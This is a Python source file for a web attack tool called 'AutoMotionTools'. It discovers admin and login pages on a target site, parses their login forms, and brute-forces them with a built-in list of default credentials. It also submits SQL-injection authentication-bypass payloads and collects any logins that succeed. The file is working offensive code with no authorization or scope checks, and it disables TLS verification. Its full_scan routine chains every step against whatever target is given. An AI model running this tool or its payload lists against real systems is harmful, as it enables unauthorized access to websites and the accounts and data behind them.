#!/usr/bin/env python3
"""
AutoMotionTools - Core Scanning Engine (Render Optimized)
"""

import requests
import re
import json
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 10
THREADS = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

session = requests.Session()
session.headers.update({"User-Agent": USER_AGENT})

ADMIN_PATHS = [
    "admin", "admin/", "admin/login.php", "admin/login", "admin/index.php",
    "administrator", "administrator/", "admin/index.html", "admin/dashboard",
    "adminpanel", "admin_panel", "admin_area", "panel", "cpanel",
    "controlpanel", "login", "login.php", "login.html", "login.aspx",
    "wp-admin", "wp-login.php", "admin/login.aspx", "admin/login.asp",
    "dashboard", "admin/dashboard.php", "backend", "backend/login",
    "user/login", "auth", "auth/login", "signin", "signin.php",
    "portal", "admin/portal.php", "admin/home.php",
    "phpmyadmin", "phpMyAdmin", "mysql", "dbadmin",
    "admin/account.php", "admin/users.php", "admin/settings.php",
    "admin/index.jsp", "admin/home.jsp", "admin/login.jsp",
    "manager", "manager/login", "console", "console/login",
    "admin/login.html", "admin/login.cgi", "admin/login.pl",
    "admin_area/", "admin_area/admin.php", "admin_area/login.php",
    "admin/login.aspx", "admin/login.asp", "admin/home.aspx",
    "admin2/", "admin2/login.php", "admin3/",
    "siteadmin/", "siteadmin/login.php", "siteadmin/login.html",
    "webadmin/", "webadmin/login.php",
    "admin/controlpanel", "admin/cp", "admin/panel",
    "controlpanel/", "cp/", "cpanel/",
]

COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "root"), ("admin", "letmein"),
    ("admin", "pass"), ("admin", "administrator"),
    ("administrator", "administrator"), ("administrator", "admin"),
    ("root", "root"), ("root", "admin"), ("root", "toor"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("test", "test"), ("test", "123456"), ("guest", "guest"),
    ("support", "support"), ("admin", "admin@123"),
    ("admin", "admin12345"), ("admin", "1q2w3e4r"),
    ("admin", "qwerty"), ("admin", "123456789"),
    ("admin", "passw0rd"), ("admin", "P@ssw0rd"),
    ("admin", "admin2024"), ("admin", "Admin@123"),
    ("admin", "1234"), ("admin", "abc123"),
    ("admin", "12345"), ("admin", "password123"),
    ("admin", "admin1"), ("admin", "admin12"),
    ("admin", "pa$$word"), ("admin", "Passw0rd!"),
    ("admin", "welcome"), ("admin", "master"),
    ("admin", "changeme"), ("admin", "temp123"),
    ("admin", "default"), ("admin", "admin2025"),
]

SQLI_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' --", ""),
    ("admin' #", ""),
    ("' OR 1=1 --", ""),
    ("' OR 1=1 #", ""),
    ("' OR '1'='1' --", ""),
    ("' OR '1'='1' #", ""),
    ("admin' OR '1'='1", ""),
    ("admin' OR 1=1--", ""),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"1"),
    ("admin\"--", ""),
    ("' UNION SELECT 1,1 --", ""),
    ("' UNION SELECT 1,1 #", ""),
    ("admin' AND 1=1 --", ""),
    ("admin'/*", ""),
    ("' OR 1=1 -- -", ""),
    ("' OR 1=1 #", ""),
    ("1' OR '1' = '1", "1' OR '1' = '1"),
]

class AutoMotionScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self.results = {
            "target": self.target_url,
            "admin_panels": [],
            "login_forms": [],
            "credentials_found": [],
            "sqli_bypasses": []
        }
    
    def _extract_title(self, html):
        try:
            soup = BeautifulSoup(html, 'html.parser')
            return soup.title.string.strip() if soup.title else "No Title"
        except:
            return "No Title"
    
    def check_path(self, path):
        """Check if a path is a valid admin/login page."""
        url = urljoin(self.target_url + "/", path.lstrip("/"))
        try:
            resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True, verify=False)
            if resp.status_code in [200, 301, 302, 401, 403]:
                content = resp.text.lower()
                indicators = ["password", "login", "username", "sign in", 
                            "signin", "admin", "log in", "authenticate",
                            "credentials", "email", "user name", "sign-in"]
                score = sum(1 for ind in indicators if ind in content)
                if score >= 2 or resp.status_code in [401, 403]:
                    return {
                        "url": url,
                        "status": resp.status_code,
                        "score": score,
                        "title": self._extract_title(resp.text)
                    }
        except:
            pass
        return None
    
    def find_admin_panels(self):
        """Multi-threaded admin panel discovery."""
        results = []
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(self.check_path, p): p for p in ADMIN_PATHS}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
        self.results["admin_panels"] = results
        return results
    
    def detect_login_forms(self, url):
        """Detect login forms from a page URL."""
        try:
            resp = self.session.get(url, timeout=TIMEOUT, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            detected = []
            
            for form in forms:
                form_text = form.get_text().lower()
                if any(kw in form_text for kw in ['password', 'login', 'sign in', 'signin']):
                    inputs = form.find_all('input')
                    fields = {}
                    for inp in inputs:
                        name = inp.get('name') or inp.get('id') or ''
                        type_ = inp.get('type', 'text')
                        if name:
                            fields[name] = type_
                    
                    action = form.get('action', '')
                    if action and not action.startswith('http'):
                        action = urljoin(url, action)
                    else:
                        action = url
                    
                    method = form.get('method', 'post').upper()
                    
                    detected.append({
                        "page_url": url,
                        "action": action,
                        "method": method,
                        "fields": fields
                    })
            
            self.results["login_forms"].extend(detected)
            return detected
        except Exception as e:
            return []
    
    def _attempt_login(self, form_info, username, password):
        """Try a single credential pair."""
        action = form_info['action']
        method = form_info['method']
        fields = form_info['fields']
        
        user_field = None
        pass_field = None
        other_fields = {}
        
        for fname, ftype in fields.items():
            fn = fname.lower()
            if any(kw in fn for kw in ['user', 'email', 'login', 'name', 'log']):
                if not user_field: user_field = fname
            elif any(kw in fn for kw in ['pass', 'pwd', 'secret', 'password']):
                if not pass_field: pass_field = fname
            elif ftype == 'hidden':
                other_fields[fname] = ''
        
        if not user_field or not pass_field:
            return None
        
        payload = {user_field: username, pass_field: password}
        payload.update(other_fields)
        
        # Add common submit button if not present
        if 'submit' not in payload:
            payload['submit'] = 'Login'
        
        try:
            if method == 'POST':
                resp = self.session.post(action, data=payload, timeout=TIMEOUT, 
                                        allow_redirects=False, verify=False)
            else:
                resp = self.session.get(action, params=payload, timeout=TIMEOUT, 
                                       allow_redirects=False, verify=False)
            
            success = False
            if resp.status_code == 302:
                success = True  # Redirect after login
            elif resp.status_code == 200:
                content = resp.text.lower()
                fail_indicators = ['invalid', 'incorrect', 'wrong', 'failed', 
                                  'error', 'try again', 'not found', 'denied']
                fail_score = sum(1 for ind in fail_indicators if ind in content)
                
                if fail_score < 2:
                    dashboard_indicators = ['dashboard', 'logout', 'welcome', 
                                           'admin panel', 'profile', 'my account',
                                           'settings', 'administration']
                    dash_score = sum(1 for ind in dashboard_indicators if ind in content)
                    if dash_score >= 1:
                        success = True
            
            if success:
                return {"username": username, "password": password, "status": resp.status_code}
        except:
            pass
        return None
    
    def brute_force_login(self, form_info, custom_creds=None):
        """Brute force credentials against a form."""
        creds = custom_creds or COMMON_CREDS
        results = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {}
            for u, p in creds:
                futures[executor.submit(self._attempt_login, form_info, u, p)] = (u, p)
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
        if results:
            self.results["credentials_found"].extend(results)
        return results
    
    def test_sqli_bypass(self, form_info):
        """Test SQLi auth bypass payloads."""
        results = []
        for user_payload, pass_payload in SQLI_PAYLOADS:
            result = self._attempt_login(form_info, user_payload, pass_payload if pass_payload else "anything")
            if result:
                result["payload"] = {"username": user_payload, "password": pass_payload or "anything"}
                results.append(result)
        if results:
            self.results["sqli_bypasses"].extend(results)
        return results
    
    def full_scan(self):
        """Run complete scan."""
        output = {"target": self.target_url, "steps": []}
        
        # Step 1: Admin Panels
        panels = self.find_admin_panels()
        step1 = {"name": "Admin Panel Discovery", "found": len(panels), "results": panels}
        output["steps"].append(step1)
        
        # Step 2-4: For each panel, check forms and attack
        for panel in panels[:5]:  # Limit to first 5 panels
            forms = self.detect_login_forms(panel["url"])
            for form in forms:
                output["steps"].append({"name": "Login Form Detected", "form": form})
                
                creds = self.brute_force_login(form)
                if creds:
                    output["steps"].append({"name": "Credentials Found", "results": creds})
                
                sqli = self.test_sqli_bypass(form)
                if sqli:
                    output["steps"].append({"name": "SQLi Bypass Found", "results": sqli})
        
        return output
